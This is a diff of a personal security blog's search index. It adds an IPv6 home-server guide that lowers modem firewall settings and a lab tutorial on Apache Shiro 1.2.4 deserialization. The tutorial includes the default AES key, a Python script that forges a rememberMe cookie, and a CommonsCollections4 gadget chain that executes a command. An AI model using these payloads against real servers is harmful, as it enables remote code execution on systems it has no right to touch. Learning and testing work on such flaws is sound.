@@ -1,6 +1,82 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>新年好</title>
+    <url>/post/happy-new-year/</url>
+    <content><![CDATA[<p>欢迎来到1y0ng的blog,今天是2023年的第一天，祝大家新年快乐</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>利用ipv6实现公网ip</title>
+    <url>/post/Using-ipv6-to-realize-public-ip/</url>
+    <content><![CDATA[<h3 id="背景"><strong>背景</strong></h3>
+<p>之前很羡慕别人能够有属于自己的个人博客，自己也想拥有，搭建个人博客首先就要有一台个人服务器，要搭建个人服务器得先有公网ip，然而目前公网IPv4资源紧缺，部分运营商是不会随意将公网ip提供给个人的，这就有些难受了</p>
+<h3 id="偶然发现的ipv6">偶然发现的ipv6</h3>
+<p>今天在网上冲浪的时候，突然看到一篇文章，文章中提到“十四五”期间IPv6规模部署任务和目标——2025年底县级以上政府网站完成率达到95%以上。说明在不久的未来，ipv6将替代ipv4成为主流，在查询了相关资料以后，发现目前大多数网络设备都是支持ipv6的，并且由于ipv6非常广泛，不需要使用nat去区分内外网，电脑上获取到的ipv6可以直接在公网上访问。</p>
+<p>首先我们判断自己的网络有没有ipv6，直接在命令窗口中输入ipconfig</p>
+<p><img src="https://img-blog.csdnimg.cn/94b2609b808a47a4b1fca29348ee2fbd.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>如果出现ipv6地址，并且开头不是fe80，那么此时你就已经获取到了一个公网ipv6地址了，如果没有，那么请打开路由器配置网页，一般直接在浏览器中输入网关ip就可以了，登录账号以后，打开路由器的ipv6功能，这里用的是小米的路由器，其他的路由器大家可以自行搜索如何开启ipv6</p>
+<p><img src="https://img-blog.csdnimg.cn/e8ddb9e100f6459f80167b587437493e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在打开ipv6功能以后再次输入ipconfig查看是否获取到ipv6的地址，也可以通过访问<a href="https://test-ipv6.cz/">ipv6测试</a>来看自己是否开启ipv6功能</p>
+<p><img src="https://img-blog.csdnimg.cn/90a5f83540324f2ba1e37e7ab2d3eecb.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>到这里路由器的相关配置已经结束了，但我们还是无法在公网中访问到ipv6，这是因为营业商的光猫中对ipv6进行了保护，禁止外网访问我们的ipv6地址，所以我们要对光猫进行配置，电脑浏览器访问<strong>192.168.1.1</strong>，这里要输入<strong>超级管理员</strong>的账号和密码登录才能使用高级功能，而如何获取超级管理员的账号和密码大家可以自行搜索，这里以电信为例登录</p>
+<p><img src="https://img-blog.csdnimg.cn/e6a298d939e541fca638091df69c9684.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在安全——防火墙中将<strong>防火墙等级改到低</strong>并<strong>关闭启用ipv6 session,</strong><img src="https://img-blog.csdnimg.cn/a5d7186e39f74d7a9baa696511fa37c6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在网络设置中选择<strong>INTERNET</strong>连接并选择<strong>ipv4&amp;ipv6</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/6344513f13b34277a0434f66a646c53e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>ipv6配置</p>
+<p><img src="https://img-blog.csdnimg.cn/f4b7d550a2b94c5c94c425dc6ab17a6d.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>在状态——网络侧信息中查看ipv6的地址如下图所示则说明配置成功</p>
+<p><img src="https://img-blog.csdnimg.cn/8cfc7f2b86694cfa9331934731a67947.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>到这里光猫的配置就结束了</p>
+<p>然后我们开始测试，这里使用phpstudy开启apache的80服务</p>
+<p><img src="https://img-blog.csdnimg.cn/9c840e9af29a4e4081d456914c3a81b4.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>设置防火墙的入站规则，开启80端口</p>
+<p><img src="https://img-blog.csdnimg.cn/ff9df8fe5ba94650bec4896185801fba.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>通过<a href="https://www.itdog.cn/tcping_ipv6/">IPV6版_在线tcping_tcp延迟测试_持续ping_禁ping_tcping_端口延迟测试</a></p>
+<p>对自己的ipv6进行测试</p>
+<p>全都响应了就说明ipv6公网配置成功了<img src="https://img-blog.csdnimg.cn/7b8b9bf942eb4b1b9e0fcbc93b01d571.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>到这里我们就成功获得了一个能在公网访问的ipv6地址，可以在相关的端口配置服务</p>
+<p>（记得之前三大营业商为了防止服务器满天飞而产生的监管困难，将ipv6的80、443、8080等常见端口给封锁了，但刚才测试了说明ipv6的80端口是可用的，大家有时间可以试试其他的端口）</p>
+<h3 id="一些小缺陷">一些小缺陷</h3>
+<p>1.目前暴露在公网的ipv6并不是所有人都可以访问的，只有自己的设备开启了ipv6功能上网才可以访问（一般手机使用移动数据连接是可以访问ipv6的，如果是连接wifi的话需要配置路由器开启ipv6功能）大家可以访问<a href="https://ipw.cn/ipv6/">IPv6地址查询 | IP查询(ipw.cn)</a>进行测试自己的设备是否能访问ipv6</p>
+<p>2.当前电脑使用的ipv6地址是临时ipv6地址,每一次重启电脑或者重新联网临时ipv6地址都会刷新</p>
+<p>（可以在命令窗口中输入 <strong>netsh interface IPv6 set privacy state=disable</strong> 关闭）</p>
+<h3 id="接下来的目标">接下来的目标</h3>
+<p>1.购买域名，通过域名访问公网ipv6</p>
+<p>2.在linux系统中配置ipv6公网地址</p>
+<h3 id="大佬的文章">大佬的文章</h3>
+<p><a href="https://blog.csdn.net/Cypher_X/article/details/123010419">天降公网ip | 你也许已经有公网IP了_Wuuconix的博客-CSDN博客_wsl 公网ip</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/2067426">IPv6 实用教程 - 腾讯云开发者社区-腾讯云</a></p>
+<p><a href="https://www.xiaoxinys.cn/105885.html">如何搭建ipv6服务器，服务器端搭建DDNS服务的方法-小新网</a></p>
+]]></content>
+      <categories>
+        <category>技术</category>
+      </categories>
+      <tags>
+        <tag>ipv6</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/post/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start">Quick Start</h2>
+<h3 id="Create-a-new-post">Create a new post</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server">Run server</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files">Generate static files</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>XXE漏洞详解</title>
     <url>/post/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
     <content><![CDATA[<h1 id="简介">简介</h1>
@@ -80,63 +156,6 @@
       <tags>
         <tag>xxe</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>利用ipv6实现公网ip</title>
-    <url>/post/Using-ipv6-to-realize-public-ip/</url>
-    <content><![CDATA[<h3 id="背景"><strong>背景</strong></h3>
-<p>之前很羡慕别人能够有属于自己的个人博客，自己也想拥有，搭建个人博客首先就要有一台个人服务器，要搭建个人服务器得先有公网ip，然而目前公网IPv4资源紧缺，部分运营商是不会随意将公网ip提供给个人的，这就有些难受了</p>
-<h3 id="偶然发现的ipv6">偶然发现的ipv6</h3>
-<p>今天在网上冲浪的时候，突然看到一篇文章，文章中提到“十四五”期间IPv6规模部署任务和目标——2025年底县级以上政府网站完成率达到95%以上。说明在不久的未来，ipv6将替代ipv4成为主流，在查询了相关资料以后，发现目前大多数网络设备都是支持ipv6的，并且由于ipv6非常广泛，不需要使用nat去区分内外网，电脑上获取到的ipv6可以直接在公网上访问。</p>
-<p>首先我们判断自己的网络有没有ipv6，直接在命令窗口中输入ipconfig</p>
-<p><img src="https://img-blog.csdnimg.cn/94b2609b808a47a4b1fca29348ee2fbd.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>如果出现ipv6地址，并且开头不是fe80，那么此时你就已经获取到了一个公网ipv6地址了，如果没有，那么请打开路由器配置网页，一般直接在浏览器中输入网关ip就可以了，登录账号以后，打开路由器的ipv6功能，这里用的是小米的路由器，其他的路由器大家可以自行搜索如何开启ipv6</p>
-<p><img src="https://img-blog.csdnimg.cn/e8ddb9e100f6459f80167b587437493e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在打开ipv6功能以后再次输入ipconfig查看是否获取到ipv6的地址，也可以通过访问<a href="https://test-ipv6.cz/">ipv6测试</a>来看自己是否开启ipv6功能</p>
-<p><img src="https://img-blog.csdnimg.cn/90a5f83540324f2ba1e37e7ab2d3eecb.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>到这里路由器的相关配置已经结束了，但我们还是无法在公网中访问到ipv6，这是因为营业商的光猫中对ipv6进行了保护，禁止外网访问我们的ipv6地址，所以我们要对光猫进行配置，电脑浏览器访问<strong>192.168.1.1</strong>，这里要输入<strong>超级管理员</strong>的账号和密码登录才能使用高级功能，而如何获取超级管理员的账号和密码大家可以自行搜索，这里以电信为例登录</p>
-<p><img src="https://img-blog.csdnimg.cn/e6a298d939e541fca638091df69c9684.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在安全——防火墙中将<strong>防火墙等级改到低</strong>并<strong>关闭启用ipv6 session,</strong><img src="https://img-blog.csdnimg.cn/a5d7186e39f74d7a9baa696511fa37c6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在网络设置中选择<strong>INTERNET</strong>连接并选择<strong>ipv4&amp;ipv6</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/6344513f13b34277a0434f66a646c53e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>ipv6配置</p>
-<p><img src="https://img-blog.csdnimg.cn/f4b7d550a2b94c5c94c425dc6ab17a6d.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>在状态——网络侧信息中查看ipv6的地址如下图所示则说明配置成功</p>
-<p><img src="https://img-blog.csdnimg.cn/8cfc7f2b86694cfa9331934731a67947.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>到这里光猫的配置就结束了</p>
-<p>然后我们开始测试，这里使用phpstudy开启apache的80服务</p>
-<p><img src="https://img-blog.csdnimg.cn/9c840e9af29a4e4081d456914c3a81b4.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>设置防火墙的入站规则，开启80端口</p>
-<p><img src="https://img-blog.csdnimg.cn/ff9df8fe5ba94650bec4896185801fba.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>通过<a href="https://www.itdog.cn/tcping_ipv6/">IPV6版_在线tcping_tcp延迟测试_持续ping_禁ping_tcping_端口延迟测试</a></p>
-<p>对自己的ipv6进行测试</p>
-<p>全都响应了就说明ipv6公网配置成功了<img src="https://img-blog.csdnimg.cn/7b8b9bf942eb4b1b9e0fcbc93b01d571.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>到这里我们就成功获得了一个能在公网访问的ipv6地址，可以在相关的端口配置服务</p>
-<p>（记得之前三大营业商为了防止服务器满天飞而产生的监管困难，将ipv6的80、443、8080等常见端口给封锁了，但刚才测试了说明ipv6的80端口是可用的，大家有时间可以试试其他的端口）</p>
-<h3 id="一些小缺陷">一些小缺陷</h3>
-<p>1.目前暴露在公网的ipv6并不是所有人都可以访问的，只有自己的设备开启了ipv6功能上网才可以访问（一般手机使用移动数据连接是可以访问ipv6的，如果是连接wifi的话需要配置路由器开启ipv6功能）大家可以访问<a href="https://ipw.cn/ipv6/">IPv6地址查询 | IP查询(ipw.cn)</a>进行测试自己的设备是否能访问ipv6</p>
-<p>2.当前电脑使用的ipv6地址是临时ipv6地址,每一次重启电脑或者重新联网临时ipv6地址都会刷新</p>
-<p>（可以在命令窗口中输入 <strong>netsh interface IPv6 set privacy state=disable</strong> 关闭）</p>
-<h3 id="接下来的目标">接下来的目标</h3>
-<p>1.购买域名，通过域名访问公网ipv6</p>
-<p>2.在linux系统中配置ipv6公网地址</p>
-<h3 id="大佬的文章">大佬的文章</h3>
-<p><a href="https://blog.csdn.net/Cypher_X/article/details/123010419">天降公网ip | 你也许已经有公网IP了_Wuuconix的博客-CSDN博客_wsl 公网ip</a></p>
-<p><a href="https://cloud.tencent.com/developer/article/2067426">IPv6 实用教程 - 腾讯云开发者社区-腾讯云</a></p>
-<p><a href="https://www.xiaoxinys.cn/105885.html">如何搭建ipv6服务器，服务器端搭建DDNS服务的方法-小新网</a></p>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>ipv6</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>新年好</title>
-    <url>/post/happy-new-year/</url>
-    <content><![CDATA[<p>欢迎来到1y0ng的blog,今天是2023年的第一天，祝大家新年快乐</p>
-]]></content>
   </entry>
   <entry>
     <title>java反序列化之DNSURL和CommonsCollections</title>
@@ -275,6 +294,90 @@ URL.hashCode()-&gt;handler.hashCode()-&gt;getHostAddress()</p>
       </tags>
   </entry>
   <entry>
+    <title>java反序列化之shiro550</title>
+    <url>/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bshiro550/</url>
+    <content><![CDATA[<h1 id="环境搭建">环境搭建</h1>
+<p>下载shiro</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone http://github/apache/shiro.git</span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>
+<p>用idea打开<code>shiro\samples\web</code>项目，将pom.xml中的jstl版本修改为<code>1.2</code>（大概70行的位置）</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>tomcat部署</p>
+<p><img src="image-20230325213809768.png" alt="image-20230325213809768"></p>
+<p><img src="image-20230325213837905.png" alt="image-20230325213837905"></p>
+<p>运行并打开网页</p>
+<p><img src="image-20230325215750024.png" alt="image-20230325215750024"></p>
+<h1 id="无CC依赖URLDNS反序列化验证">无CC依赖URLDNS反序列化验证</h1>
+<p>登陆处勾选Remember Me</p>
+<p><img src="image-20230325215850511.png" alt="image-20230325215850511"></p>
+<p>点击登录、抓包，发现响应包里会出现<code>rememberMe</code>字段</p>
+<p><img src="image-20230325220319641.png" alt="image-20230325220319641"></p>
+<p>同时再次发送请求时会直接发送这个rememberMe</p>
+<p><img src="image-20230325220451738.png" alt="image-20230325220451738"></p>
+<p>查找和cookierememberme有关的且在shiro包里的类，发现<code>CookieRememberMeManager类</code><img src="image-20230325220908898.png" alt="image-20230325220908898"></p>
+<p>CookieRememberMeManager的<code>getRememberedSerializedIdentity</code>接收了请求的rememberMe参数，同时对其进行base64解密</p>
+<p><img src="image-20230325222817415.png" alt="image-20230325222817415"></p>
+<p>找一下谁调用了getRememberedSerializedIdentity方法，发现是<code>AbstractRememberMeManager类</code>的<code>getRememberedPrincipals</code>方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);<span class="comment">//这里调用了getRememberedSerializedIdentity</span></span><br><span class="line">        <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">        <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            principals = convertBytesToPrincipals(bytes, subjectContext);<span class="comment">//这里对传过来的参数做进一步的处理</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">        principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> principals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查看<code>convertBytesToPrincipals</code>方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        bytes = decrypt(bytes);<span class="comment">//解密</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes);<span class="comment">//反序列化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先看一下解密的部分</p>
+<p><img src="image-20230325224357492.png" alt="image-20230325224357492"></p>
+<p>可以看到密钥是一个定值</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>并且从上方的内容可以推断出是aes加密</p>
+<p><img src="image-20230325224546707.png" alt="image-20230325224546707"></p>
+<p>deserialize方法一直追下去发现调用了<code>readObjet</code>方法</p>
+<p><img src="image-20230325224740559.png" alt="image-20230325224740559"></p>
+<p>最终大致的流程为shiro将得到的rememberMe参数进行了base64解密，然后再aes解密，最终反序列化</p>
+<p>我们用之前的DNSURL来验证一下，将序列化的test.ser文件用python脚本来生成payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.ser&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br></pre></td></tr></table></figure>
+<p>将输出结果替换为rememberMe的参数值，同时将JSESSIONID删除（否则不会对rememberMe的值反序列化）</p>
+<p><img src="image-20230325232039969.png" alt="image-20230325232039969"></p>
+<p>发送以后，发现成功收到了DNS请求，证明反序列化成功</p>
+<p><img src="image-20230325232113338.png" alt="image-20230325232113338"></p>
+<h1 id="CC4">CC4</h1>
+<p>CC4是针对commons-collections4的4.0版本的一条利用链</p>
+<p>主要是利用TransformingComparator类的compare方法调用了ChainedTransformer类的transform</p>
+<p><img src="image-20230326101200961.png" alt="image-20230326101200961"></p>
+<p>而入口则是PriorityQueue类的readObject方法，整体利用链如下：</p>
+<p>PriorityQueue#readObject</p>
+<p>PriorityQueue#heapify</p>
+<p>PriorityQueue#siftDown</p>
+<p>PriorityQueue#siftDownUsingComparator</p>
+<p>TransformingComparator#compare</p>
+<p>所以通过以下构造方法连成一条链</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br></pre></td></tr></table></figure>
+<p>但有几个需要注意的逻辑点</p>
+<p>在PriorityQueue#heapify中有</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>要想进入循环则必须满足size&gt;&gt;&gt;1要大于0，即变量 “size” 的二进制表示向右移动一位要大于0，size&gt;1</p>
+<p>所以有</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+<p>但是priorityQueue.add()会调用priorityQueue.offer()进而调用priorityQueue.siftUp()，最终到siftUpUsingComparator()调用了compare方法，也就是说在还没有反序列化之前，就已经命令执行了。</p>
+<p>要解决这个问题方法和之前的一样，在add前断开链，add后在把链接上</p>
+<p>故最后的序列化poc就是</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里把链给断开了</span></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用反射将链连上</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> TransformingComparator.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">transformerfield</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">transformerfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">transformerfield.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">Test.Serialize(priorityQueue);</span><br></pre></td></tr></table></figure>
+<h1 id="CC2">CC2</h1>
+<p>前面提到通过类的动态加载，我们只需要运行templates.newTransformer()方法就可以任意命令执行了</p>
+<p>那么我们可以通过InvokerTransformer类来执行这个方法，就可以实现命令执行了</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">invokerTransformer.transform(templates);</span><br></pre></td></tr></table></figure>
+<p>但我们总会遇到一个问题，就是transform的参数不好控制，之前我们都是采用ChainedTransformer+ConstantTransformer来解决的，但在这里，我们的参数是可控的，</p>
+<p>在PriorityQueue#heapify中要向siftDown传入两个参数，而第二个参数就是我们最终传到transform的参数</p>
